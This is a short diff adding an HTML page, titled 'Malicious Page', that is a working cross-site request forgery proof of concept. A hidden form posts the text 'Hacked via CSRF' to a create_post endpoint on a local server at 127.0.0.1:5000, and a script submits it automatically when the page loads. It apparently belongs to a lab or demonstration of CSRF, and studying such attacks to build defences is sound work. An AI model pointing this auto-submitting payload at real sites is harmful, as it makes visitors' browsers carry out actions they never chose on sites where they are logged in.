@@ -1,0 +1,13 @@
+<html>
+<body>
+    <h2>Malicious Page</h2>
+
+    <form action="http://127.0.0.1:5000/create_post" method="POST">
+        <input type="hidden" name="content" value="Hacked via CSRF">
+    </form>
+
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
